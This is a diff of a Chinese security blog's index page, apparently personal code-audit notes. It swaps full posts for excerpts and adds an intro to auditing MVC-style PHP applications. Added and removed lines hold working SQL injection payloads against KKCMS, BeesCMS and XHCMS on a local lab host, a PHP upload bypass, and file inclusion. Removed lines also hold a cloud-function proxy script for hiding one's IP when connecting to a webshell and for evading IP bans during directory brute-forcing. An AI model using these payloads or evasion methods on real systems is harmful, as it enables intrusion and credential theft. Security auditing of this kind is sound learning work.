@@ -81,7 +81,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">17</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">18</span></a></li>
   </ul>
 </nav>
 
@@ -126,7 +126,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -180,7 +180,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/">
+    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/12/%E5%85%A5%E9%97%A8MVC%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/touxiang.jpg">
@@ -198,7 +198,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">KKCMS v1.32审计</a>
+          <a href="/2022/08/12/%E5%85%A5%E9%97%A8MVC%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">入门MVC结构代码审计</a>
         </h2>
 
         <div class="post-meta-container">
@@ -208,15 +208,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2022-08-11 23:34:36" itemprop="dateCreated datePublished" datetime="2022-08-11T23:34:36+08:00">2022-08-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-08-12 15:22:15" itemprop="dateModified" datetime="2022-08-12T15:22:15+08:00">2022-08-12</time>
+      <time title="创建时间：2022-08-12 16:17:46 / 修改时间：16:17:34" itemprop="dateCreated datePublished" datetime="2022-08-12T16:17:46+08:00">2022-08-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -238,17 +232,41 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="KKCMS-v1-32审计"><a href="#KKCMS-v1-32审计" class="headerlink" title="KKCMS v1.32审计"></a>KKCMS v1.32审计</h1><h2 id="前台注入1"><a href="#前台注入1" class="headerlink" title="前台注入1"></a>前台注入1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/bplay.php?play=a AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="前台注入2"><a href="#前台注入2" class="headerlink" title="前台注入2"></a>前台注入2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#x27; AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND &#x27;qLKJ&#x27;=&#x27;qLKJ</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="未授权添加用户"><a href="#未授权添加用户" class="headerlink" title="未授权添加用户"></a>未授权添加用户</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/kkcms/ucenter/cms_user_add.php</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1 AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</span></span><br></pre></td></tr></table></figure>
-
-<p>这套一堆都是重复的注入</p>
-<p>没意思 不写了</p>
-
+          <h1 id="入门MVC结构代码审计"><a href="#入门MVC结构代码审计" class="headerlink" title="入门MVC结构代码审计"></a>入门MVC结构代码审计</h1><ul>
+<li>**Model :**模型层（用于数据库打交道）</li>
+<li>**View :**视图层（用于展示内容给用户看）</li>
+<li><strong>Controller</strong> :控制层（控制业务逻辑）</li>
+</ul>
+<p>M是指业务模型，V是指用户界面，C则是控制器</p>
+<p>MVC各部分的职能：</p>
+<ul>
+<li>模型Model – 管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。</li>
+<li>控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。</li>
+<li>视图View – 负责渲染数据，通过HTML方式呈现给用户。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208121558721.gif" alt="MVC流程图"></p>
+<blockquote>
+<p>一个典型的Web MVC流程：</p>
+<ol>
+<li>Controller截获用户发出的请求；</li>
+<li>Controller调用Model完成状态的读写操作；</li>
+<li>Controller把数据传递给View；</li>
+<li>View渲染最终结果并呈献给用户。</li>
+</ol>
+</blockquote>
+<p>MVC 一般有两种审计模式：</p>
+<h4 id="直接审计控制器"><a href="#直接审计控制器" class="headerlink" title="直接审计控制器"></a>直接审计控制器</h4><blockquote>
+<p>也就C的内容，再追踪一些函数。全局搜索一下**filt__**，因为 <strong>filt</strong> 的英文意思为过滤，可以通过全局搜索这样式的函数来查看一下过滤规则。这种一般是比较快速审计。</p>
+<p>但是这种情况一般建立在你可以清晰明白该款CMS的路由规则，适合老鸟，方便根据审计出来的漏洞的点去回溯验证</p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/12/%E5%85%A5%E9%97%A8MVC%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -344,24 +362,114 @@
 
 <p>&#x2F;&#x2F;利用双写+空格绕过过滤<br>&#x2F;&#x2F;爆破表名</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect table_name fr from om information_schema.tables wh where ere table_schema like &#x27;</span>beescms<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
 
-<p>&#x2F;&#x2F;爆破列名</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect column_name fr from om information_schema.columns wh where ere table_name like &#x27;</span>bees_admin<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure>
+    
+    
+    
 
-<p>&#x2F;&#x2F;爆破admin账户名:admin</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect admin_name fr from om beescms.bees_admin limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
-<p>&#x2F;&#x2F;结合substr全部爆破密码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,substr((selselectect admin_password fr from om beescms.bees_admin limit 0,1),3,32),0x7e))#</span></span><br></pre></td></tr></table></figure>
 
-<p>&#x2F;&#x2F;21232f297a57a5a743894a0e4a801fc3很明显的md5函数处理：admin</p>
-<h2 id="后台文件上传1"><a href="#后台文件上传1" class="headerlink" title="后台文件上传1"></a>后台文件上传1</h2><p>mime类型绕过<br><a target="_blank" rel="noopener" href="http://127.0.0.1/beescms/admin/admin_pic_upload.php">http://127.0.0.1/beescms/admin/admin_pic_upload.php</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value_arr</span>=<span class="title function_ invoke__">up_img</span>(<span class="variable">$pic_info</span>,<span class="variable">$is_up_size</span>,<span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/bmp&#x27;</span>,<span class="string">&#x27;image/pjpeg&#x27;</span>,<span class="string">&#x27;image/x-png&#x27;</span>),<span class="variable">$up_is_thumb</span>,<span class="variable">$up_thumb_width</span>,<span class="variable">$up_thumb_height</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_name_alt</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">up_img</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$size</span>,<span class="variable">$type</span>,<span class="variable">$thumb</span>=<span class="number">0</span>,<span class="variable">$thumb_width</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$thumb_height</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_alt</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$file_type</span>=<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_type</span>),<span class="variable">$type</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">msg</span>(<span class="string">&#x27;上传图片格式不正确&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>只对Content-Type： 进行了对比<br>所以修改Content-Type： 即可进行文件上传绕过<br>Content-Disposition: form-data; name&#x3D;”up[]”; filename&#x3D;”1.php”<br>Content-Type: image&#x2F;png</p>
-<h2 id="后台文件上传2"><a href="#后台文件上传2" class="headerlink" title="后台文件上传2"></a>后台文件上传2</h2><p>同样是mime类型绕过<br>up_img()函数<br><a target="_blank" rel="noopener" href="http://127.0.0.1/beescms/admin/upload.php">http://127.0.0.1/beescms/admin/upload.php</a></p>
-<h2 id="后台文件上传3"><a href="#后台文件上传3" class="headerlink" title="后台文件上传3"></a>后台文件上传3</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1/beescms/admin/admin_sys.php">http://127.0.0.1/beescms/admin/admin_sys.php</a><br>修改允许上传文件类型<br>添加一个php类型<br>然后<br><a target="_blank" rel="noopener" href="http://127.0.0.1/beescms/admin/admin_file_upload.php">http://127.0.0.1/beescms/admin/admin_file_upload.php</a><br>即可上传php文件</p>
 
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="LiAoRJ">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LiAoRJ的成长记录">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | LiAoRJ的成长记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">KKCMS v1.32审计</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-08-11 23:34:36" itemprop="dateCreated datePublished" datetime="2022-08-11T23:34:36+08:00">2022-08-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-08-12 15:22:15" itemprop="dateModified" datetime="2022-08-12T15:22:15+08:00">2022-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="KKCMS-v1-32审计"><a href="#KKCMS-v1-32审计" class="headerlink" title="KKCMS v1.32审计"></a>KKCMS v1.32审计</h1><h2 id="前台注入1"><a href="#前台注入1" class="headerlink" title="前台注入1"></a>前台注入1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/bplay.php?play=a AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="前台注入2"><a href="#前台注入2" class="headerlink" title="前台注入2"></a>前台注入2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#x27; AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND &#x27;qLKJ&#x27;=&#x27;qLKJ</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="未授权添加用户"><a href="#未授权添加用户" class="headerlink" title="未授权添加用户"></a>未授权添加用户</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/kkcms/ucenter/cms_user_add.php</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1 AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</span></span><br></pre></td></tr></table></figure>
+
+<p>这套一堆都是重复的注入</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -453,12 +561,14 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="后台文件包含"><a href="#后台文件包含" class="headerlink" title="后台文件包含"></a>后台文件包含</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="前台注入"><a href="#前台注入" class="headerlink" title="前台注入"></a>前台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure>
-
-<p>addslashes 防SQL注入 转义单引号 ‘  &#39;</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE content SET hit = hit+1 WHERE id=<span class="subst">$id</span>&quot;</span>; <span class="comment">//这里没用到单引号闭合 所以存在SQL注入</span></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -550,55 +660,14 @@
 <p>利用云函数的多出口、无需服务器承载的特性，我们可以在实战攻防演练中实现隐藏自身。</p>
 <p>具体应用如下：</p>
 <h3 id="1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell"><a href="#1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell" class="headerlink" title="1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell"></a>1、<strong>利用云函数API配置蚁剑实现隐藏自身IP连接Webshell</strong></h3><p> 首先创建云函数：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208011625530.png" alt="image-202208011625530"></p>
-<p><strong>函数代码：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment">#忽略证书校验</span></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    _create_unverified_https_context = ssl._create_unverified_context</span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ssl._create_default_https_context = _create_unverified_https_context</span><br><span class="line">    </span><br><span class="line">user_agent = [<span class="string">&#x27;Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">requests_headers</span>():</span><br><span class="line">    UA = random.choice(user_agent)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: UA,</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;10.10.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>)), <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>))),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="comment">#url = unquote(event[&#x27;queryString&#x27;][&#x27;url&#x27;])</span></span><br><span class="line">    url = event[<span class="string">&#x27;queryString&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    agrs = event[<span class="string">&#x27;queryString&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> agrs.keys():</span><br><span class="line">        <span class="keyword">if</span> key != <span class="string">&quot;url&quot;</span>:</span><br><span class="line">            url += <span class="string">&quot;&amp;&quot;</span> +  key + <span class="string">&quot;=&quot;</span> + agrs[key]</span><br><span class="line">    method = event[<span class="string">&#x27;httpMethod&#x27;</span>]</span><br><span class="line">    headers = requests_headers()</span><br><span class="line">    <span class="comment">#headers = event[&#x27;headers&#x27;]</span></span><br><span class="line">    timeout = <span class="number">60</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = event[<span class="string">&#x27;body&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        headers.update(&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;)</span><br><span class="line">        html = requests.post(url=url, headers=headers, timeout=timeout, verify=<span class="literal">False</span>, data=data)</span><br><span class="line">    <span class="keyword">elif</span> method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        html = requests.get(url=url, headers=headers, timeout=timeout, verify=<span class="literal">False</span>, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(html.text))</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: html.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;,</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: html.text</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>接着在函数管理这里将执行超时时间设置为900秒</p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020853243.png" alt="image-20220802085326165"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020854463.png" alt="image-20220802085338583"></p>
-<p><strong>创建触发器：</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020852566.png" alt="image-20220802085206404"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020852869.png" alt="image-20220802085237776"></p>
-<p>会得到一个访问路径</p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020858448.png" alt="image-20220802085845373"></p>
-<p>利用蚁剑进行Webshell连接即可</p>
-<p>路径为：</p>
-<p><a target="_blank" rel="noopener" href="https://service-h8ew8bu0-xxxxxxxxxxx.gz.apigw.tencentcs.com/release/xxxxx?url=Webshell%E5%9C%B0%E5%9D%80">https://service-h8ew8bu0-xxxxxxxxxxx.gz.apigw.tencentcs.com/release/xxxxx?url=Webshell地址</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020900807.png" alt="image-20220802090055742"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021041881.png" alt="image-20220802104133594"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021041975.png" alt="image-20220802104151793"></p>
-<p>可以看到日志里的ip都是上海的</p>
-<h2 id="2、联动dirsearch多出口爆破目录防BanIP"><a href="#2、联动dirsearch多出口爆破目录防BanIP" class="headerlink" title="2、联动dirsearch多出口爆破目录防BanIP"></a>2、联动dirsearch多出口爆破目录防BanIP</h2><p>首先下载一下SCF-Proxy</p>
-<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/hashsecteam/scf-proxy"><a target="_blank" rel="noopener" href="https://github.com/Sakurasan/scf-proxy">GitHub - Sakurasan&#x2F;scf-proxy: 云函数代理服务</a></a></p>
-<p>Go环境下编译一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh build.sh</span><br></pre></td></tr></table></figure>
-
-<p>获得一个main.zip</p>
-<p>接着在&#x2F;scf-proxy&#x2F;cmd 路径下编译一下 client.go</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -trimpath client.go</span><br></pre></td></tr></table></figure>
-
-<p><strong>新建云函数</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021142219.png" alt="image-20220802114215068"></p>
-<p><strong>创建触发器</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021143851.png" alt="image-20220802114341667"></p>
-<p>同样别忘记了设置超时时间900秒</p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021144244.png" alt="image-20220802114450106"></p>
-<p>然后客户端设置监听</p>
-<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./<span class="keyword">client</span> -p <span class="number">8888</span> -scfurl https:<span class="comment">//云函数访问路径</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021152005.png" alt="image-20220802115207900"></p>
-<p>这里就算成功了</p>
-<p>效果测试</p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021200131.png" alt="image-20220802120024033"></p>
-<p>使用dirsearch爆破目录</p>
